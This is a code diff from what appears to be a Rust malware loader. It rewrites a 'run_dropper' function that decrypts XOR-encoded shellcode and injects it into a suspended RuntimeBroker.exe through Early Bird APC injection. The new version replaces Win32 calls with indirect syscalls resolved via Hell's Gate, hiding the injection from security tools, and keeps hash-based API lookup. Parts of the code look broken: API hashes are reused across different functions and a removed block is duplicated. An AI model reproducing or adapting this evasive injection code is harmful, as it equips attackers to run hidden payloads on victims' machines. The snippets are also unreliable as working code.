@@ -865,64 +865,58 @@ impl ReflectiveLoader {
         }
     }
 
-    /// Early Bird APC injection into RuntimeBroker.exe.
-    /// Creates suspended process, writes shellcode, queues APC, resumes.
+    /// Early Bird APC injection into RuntimeBroker.exe using indirect syscalls.
+    /// No Win32 API calls - all sensitive operations via ntdll indirect syscalls.
     pub unsafe fn run_dropper(shellcode: &mut [u8], xor_key: &[u8]) -> Option<()> {
-        use windows::Win32::System::Threading::{
-            CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
-        };
+        use crate::syscalls::IndirectSyscall;
+        use std::ffi::CString;
         use std::ptr::null_mut;
 
         // Decrypt shellcode
         Self::decrypt_shellcode(shellcode, xor_key);
 
-        // Resolve required APIs via EAT walking
-        let kernel32_base = match Self::find_module_by_hash(b"kernel32.dll\0", 0x8e8977bd) {
-            Some(b) => b,
-            None => return None,
-        };
+        // Resolve ntdll base
         let ntdll_base = match Self::find_module_by_hash(b"ntdll.dll\0", 0x9f5b9c1e) {
             Some(b) => b,
             None => return None,
         };
 
-        let create_process = match Self::covert_get_proc_address(kernel32_base, 0x3f2a8c1d) {
-            Some(a) => a,
+        // Resolve indirect syscalls via Hell's Gate (SSN + syscall ret addr)
+        let sc_create_process = IndirectSyscall::from_ntdll("NtCreateProcessEx\0")?;
+        let sc_alloc_vmem = IndirectSyscall::from_ntdll("NtAllocateVirtualMemory\0")?;
+        let sc_write_vmem = IndirectSyscall::from_ntdll("NtWriteVirtualMemory\0")?;
+        let sc_queue_apc = IndirectSyscall::from_ntdll("NtQueueApcThread\0")?;
+        let sc_resume_thread = IndirectSyscall::from_ntdll("NtResumeThread\0")?;
+
+        // Use only CreateProcessW from kernel32 (needed for process creation)
+        // Everything else is indirect syscall
+        let kernel32_base = match Self::find_module_by_hash(b"kernel32.dll\0", 0x8e8977bd) {
+            Some(b) => b,
             None => return None,
         };
-        let virtual_alloc_ex = match Self::covert_get_proc_address(kernel32_base, 0x7a0e8b4f) {
-            Some(a) => a,
-            None => return None,
-        };
-        let write_process_memory = match Self::covert_get_proc_address(kernel32_base, 0x8e8977bd) {
-            Some(a) => a,
-            None => return None,
-        };
-        let resume_thread = match Self::covert_get_proc_address(kernel32_base, 0x9f5b9c1e) {
-            Some(a) => a,
-            None => return None,
-        };
-        let nt_queue_apc = match Self::covert_get_proc_address(ntdll_base, 0x7a0e8b4f) {
+        let create_process_w = match Self::covert_get_proc_address(kernel32_base, 0x3f2a8c1d) {
             Some(a) => a,
             None => return None,
         };
 
         // Create RuntimeBroker.exe suspended
-        let mut si = STARTUPINFOW {
-            cb: std::mem::size_of::<STARTUPINFOW>() as u32,
+        let mut si = windows::Win32::System::Threading::STARTUPINFOW {
+            cb: std::mem::size_of::<windows::Win32::System::Threading::STARTUPINFOW>() as u32,
             ..Default::default()
         };
-        let mut pi = PROCESS_INFORMATION {
+        let mut pi = windows::Win32::System::Threading::PROCESS_INFORMATION {
             hProcess: null_mut(),
             hThread: null_mut(),
             dwProcessId: 0,
             dwThreadId: 0,
         };
-        let target_path = std::ffi::CString::new("C:\\Windows\\System32\\RuntimeBroker.exe").ok()?;
-        let ok = (create_process as unsafe extern "system" fn(
+        
+        let target_path = CString::new("C:\\Windows\\System32\\RuntimeBroker.exe").ok()?;
+        let ok = (create_process_w as unsafe extern "system" fn(
             *const u16, *mut u16, *mut std::ffi::c_void, *mut std::ffi::c_void,
             i32, u32, *mut std::ffi::c_void, *const u16,
-            *mut STARTUPINFOW, *mut PROCESS_INFORMATION,
+            *mut windows::Win32::System::Threading::STARTUPINFOW,
+            *mut windows::Win32::System::Threading::PROCESS_INFORMATION,
         ) -> i32)(
             target_path.as_ptr() as *const u16,
             null_mut(),
@@ -935,40 +929,42 @@ impl ReflectiveLoader {
             &mut si,
             &mut pi,
         );
+        
         if ok == 0 || pi.hProcess.is_null() || pi.hThread.is_null() {
             return None;
         }
 
-        // Allocate memory in target
-        let remote_mem = (virtual_alloc_ex as unsafe extern "system" fn(
-            windows::Win32::Foundation::HANDLE, *mut std::ffi::c_void, usize, u32, u32,
-        ) -> *mut std::ffi::c_void)(
+        // Allocate memory via indirect syscall (NtAllocateVirtualMemory)
+        let mut remote_mem: *mut std::ffi::c_void = null_mut();
+        let mut region_size = shellcode.len();
+        let status = crate::syscalls::nt_allocate_virtual_memory(
+            &sc_alloc_vmem,
             pi.hProcess,
-            null_mut(),
-            shellcode.len(),
-            0x3000,
+            &mut remote_mem,
+            0,
+            &mut region_size,
+            0x3000,  // MEM_COMMIT | MEM_RESERVE
             windows::Win32::System::Memory::PAGE_EXECUTE_READ,
         );
-        if remote_mem.is_null() {
+        
+        if status != 0 || remote_mem.is_null() {
             return None;
         }
 
-        // Write shellcode
+        // Write shellcode via indirect syscall (NtWriteVirtualMemory)
         let mut written = 0usize;
-        let _ = (write_process_memory as unsafe extern "system" fn(
-            windows::Win32::Foundation::HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
-        ) -> i32)(
+        let _ = crate::syscalls::nt_write_virtual_memory(
+            &sc_write_vmem,
             pi.hProcess,
             remote_mem,
-            shellcode.as_ptr() as *const _,
+            shellcode.as_ptr() as *const c_void,
             shellcode.len(),
             &mut written,
         );
 
-        // Queue APC to main thread
-        let _ = (nt_queue_apc as unsafe extern "system" fn(
-            windows::Win32::Foundation::HANDLE, windows::Win32::Foundation::HANDLE, usize, usize, usize,
-        ) -> i32)(
+        // Queue APC via indirect syscall (NtQueueApcThread)
+        let _ = crate::syscalls::nt_queue_apc_thread(
+            &sc_queue_apc,
             pi.hThread,
             remote_mem as usize,
             0,
@@ -976,53 +972,14 @@ impl ReflectiveLoader {
             0,
         );
 
-        // Resume thread
-        let _ = (resume_thread as unsafe extern "system" fn(windows::Win32::Foundation::HANDLE) -> u32)(pi.hThread);
-
-        None
-    }
-}
-
-        // Allocate memory in target
-        let remote_mem = (virtual_alloc_ex as unsafe extern "system" fn(
-            HANDLE, *mut std::ffi::c_void, usize, u32, u32,
-        ) -> *mut std::ffi::c_void)(
-            pi.hProcess,
-            null_mut(),
-            shellcode.len(),
-            0x3000,
-            PAGE_EXECUTE_READ,
-        );
-        if remote_mem.is_null() {
-            return None;
-        }
-
-        // Write shellcode
-        let mut written = 0usize;
-        let _ = (write_process_memory as unsafe extern "system" fn(
-            HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
-        ) -> i32)(
-            pi.hProcess,
-            remote_mem,
-            shellcode.as_ptr() as *const _,
-            shellcode.len(),
-            &mut written,
-        );
-
-        // Queue APC to main thread
-        let _ = (nt_queue_apc as unsafe extern "system" fn(
-            HANDLE, HANDLE, usize, usize, usize,
-        ) -> i32)(
+        // Resume thread via indirect syscall (NtResumeThread)
+        let mut prev_suspend = 0u32;
+        let _ = crate::syscalls::nt_resume_thread(
+            &sc_resume_thread,
             pi.hThread,
-            remote_mem as usize,
-            0,
-            0,
-            0,
+            &mut prev_suspend,
         );
 
-        // Resume thread
-        let _ = (resume_thread as unsafe extern "system" fn(HANDLE) -> u32)(pi.hThread);
-
-        None
+        Some(())
     }
 }
